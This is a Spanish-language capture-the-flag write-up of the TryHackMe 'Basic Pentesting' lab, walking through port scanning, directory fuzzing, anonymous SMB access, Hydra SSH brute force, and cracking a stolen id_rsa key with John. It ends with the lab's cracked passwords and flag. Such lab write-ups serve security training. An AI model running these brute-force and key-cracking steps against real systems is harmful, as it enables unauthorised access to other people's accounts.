# üß® Basic Pentesting ‚Äî TryHackMe CTF
**Fecha:** 17 de Noviembre, 2025  
**Plataforma:** TryHackMe  
**Autor:** rSamCod  
**Resumen:**  
Esta m√°quina es un laboratorio cl√°sico orientado a la **enumeraci√≥n**, **fuzzing**, **SMB**, **fuerza bruta v√≠a Hydra**, y **escalada lateral mediante claves SSH**.

---

# Fase 1 ‚Äî Enumeraci√≥n Inicial

## 1.1 Escaneo de Puertos (Full Scan)

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.201.4.242 -oG allPorts
```

**Explicaci√≥n de par√°metros:**
- **-p-** ‚Üí escanea todos los puertos (1-65535).  
- **-sS** ‚Üí TCP SYN Scan (r√°pido y sigiloso).  
- **--open** ‚Üí muestra solo puertos abiertos.  
- **--min-rate 5000** ‚Üí env√≠a m√≠nimo 5000 paquetes/seg para acelerar.  
- **-vvv** ‚Üí m√°xima verbosidad.  
- **-n** ‚Üí no resuelve DNS (m√°s r√°pido).  
- **-Pn** ‚Üí desactiva el host discovery (asume host "UP").  
- **-oG allPorts** ‚Üí exporta salida en formato grepeable.

```bash
cat allPorts
```

<img width="1900" height="790" alt="Captura de pantalla 2025-11-17 120524" src="https://github.com/user-attachments/assets/2b34e892-ae76-4c62-8102-67c96a9c554c" />


---

# Fase 2 ‚Äî Escaneo Espec√≠fico

Con los puertos encontrados (22, 80, 139, 445):

```bash
nmap -p22,80,139,445 -sC -sV 10.201.4.242 -oN targeted
```

**Par√°metros nuevos:**
- **-sC** ‚Üí ejecuta los scripts NSE por defecto.  
- **-sV** ‚Üí detecta versiones de servicios.  
- **-oN** ‚Üí guarda la salida en formato normal.

```bash
cat targeted
```

<img width="1897" height="853" alt="Captura de pantalla 2025-11-17 120819" src="https://github.com/user-attachments/assets/5e39ffb4-cbb5-48c7-8623-253a459adc1f" />


---

# Fase 3 ‚Äî Enumeraci√≥n Web

La p√°gina web muestra un **comentario HTML** que revela la existencia de otros directorios.

<img width="1900" height="396" alt="Captura de pantalla 2025-11-17 120947" src="https://github.com/user-attachments/assets/06d59da9-4d94-4fa4-8bbd-1e3218f8dfce" />

## 3.1 Fuzzing de Directorios

```bash
gobuster dir -u 10.201.4.242 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Par√°metros:**
- **dir** ‚Üí modo directorios.  
- **-u** ‚Üí URL objetivo.  
- **-w** ‚Üí diccionario de palabras.

<img width="1897" height="684" alt="Captura de pantalla 2025-11-17 121426" src="https://github.com/user-attachments/assets/7b374fcc-9d9f-4db2-a53b-8e47841d1c66" />


Se identifica el directorio:

```
/development
```

<img width="1900" height="439" alt="Captura de pantalla 2025-11-17 121442" src="https://github.com/user-attachments/assets/7c068d09-2a00-4878-afbd-2d5d916c5da7" />


Dentro se observa una conversaci√≥n entre dos usuarios (**k** y **j**) que parecen ser parte del staff del sitio.

---

# Fase 4 ‚Äî Enumeraci√≥n SMB

Probamos acceso an√≥nimo en SMB:

```bash
smbclient -L //10.201.4.242 -N
```

**Par√°metros:**
- **-L** ‚Üí lista recursos compartidos.  
- **-N** ‚Üí no utiliza contrase√±a.

<img width="1895" height="286" alt="Captura de pantalla 2025-11-17 121902" src="https://github.com/user-attachments/assets/d98cc0d7-6983-4a8e-95f0-b0be1211f0b2" />

Encontramos el recurso:

```
Anonymous
```

Ingresamos:

```bash
smbclient //10.201.4.242/Anonymous -N
```

Obtenemos el archivo **staff.txt**:

```bash
get staff.txt
```

<img width="1897" height="296" alt="Captura de pantalla 2025-11-17 122145" src="https://github.com/user-attachments/assets/ae233a22-b985-44ac-bb8c-d444db3f0b46" />

Lo revisamos:

```bash
cat staff.txt
```

<img width="1894" height="405" alt="Captura de pantalla 2025-11-17 122236" src="https://github.com/user-attachments/assets/73fa4f96-22a1-48f9-9694-d1e31d6d846b" />


El archivo revela a **jan** y **kay**, y mencionaban antes en la web development que **jan usa una contrase√±a d√©bil**.

---

# Fase 5 ‚Äî Fuerza Bruta SSH con Hydra

Procedemos contra el puerto 22:

```bash
hydra -l jan -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt ssh://10.201.4.242
```

**Par√°metros nuevos:**
- **-l** ‚Üí usuario fijo.  
- **-P** ‚Üí diccionario de contrase√±as.  
- **ssh://** ‚Üí protocolo a atacar.

<img width="1895" height="373" alt="Captura de pantalla 2025-11-17 122620" src="https://github.com/user-attachments/assets/865bc35d-0dd5-47a7-aad8-4fff4fac349d" />

**Contrase√±a encontrada:** `armando`

---

# üßë‚Äçüíª Fase 6 ‚Äî Acceso SSH

```bash
ssh jan@10.201.4.242
```

Con el usuario `jan`, exploramos y encontramos un directorio oculto:

```
.ssh
```

<img width="1886" height="597" alt="Captura de pantalla 2025-11-17 122944" src="https://github.com/user-attachments/assets/e1bb7837-907b-41ca-86b2-a67e67a11e15" />

Dentro descubrimos una clave privada:

```bash
cat id_rsa
```

<img width="1896" height="856" alt="Captura de pantalla 2025-11-17 125023" src="https://github.com/user-attachments/assets/a7834840-7ace-4a91-a519-4eb42a1db1c3" />


---

# Fase 7 ‚Äî Cracking de id_rsa con John

Convertimos la clave a formato aceptable:

```bash
ssh2john id_rsa > hash
```

<img width="1894" height="788" alt="Captura de pantalla 2025-11-17 125320" src="https://github.com/user-attachments/assets/17448b09-dc30-4b9f-b2bf-8c5fc17eac21" />


Ahora crackeamos:

```bash
john -w:/usr/share/wordlists/rockyou.txt hash
```

<img width="1896" height="360" alt="Captura de pantalla 2025-11-17 125647" src="https://github.com/user-attachments/assets/e3d56505-6bb7-4e43-86f5-2a7df49e149e" />


**Contrase√±a encontrada:** `beeswax`

---

# Fase 8 ‚Äî Ingreso como kay

Primero fijamos permisos correctos:

```bash
chmod 600 id_rsa
```

<img width="1903" height="393" alt="Captura de pantalla 2025-11-17 125908" src="https://github.com/user-attachments/assets/b899ba62-b317-4326-a76a-74a7c6b3a204" />

Ingresamos:

```bash
ssh -i id_rsa kay@10.201.4.242
```

Listamos contenido:

```bash
ls -al
```

Encontramos:

```
pass.bak
```

```bash
cat pass.bak
```

<img width="1886" height="412" alt="Captura de pantalla 2025-11-17 130147" src="https://github.com/user-attachments/assets/1fd786ca-18db-4e72-93d4-509cdc13f78a" />

**FLAG:**  
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

---

# Lecciones Aprendidas

- La enumeraci√≥n inicial es clave para identificar superficies vulnerables.  
- SMB mal configurado expone informaci√≥n cr√≠tica sin autenticaci√≥n.  
- Las contrase√±as d√©biles siguen siendo una v√≠a com√∫n de compromiso.  
- No proteger claves SSH (id_rsa) es una falla grave que permite escalada lateral.  
- Wordlists como *rockyou* siguen siendo altamente efectivas.  
- Los servicios expuestos deben auditarse regularmente.

---
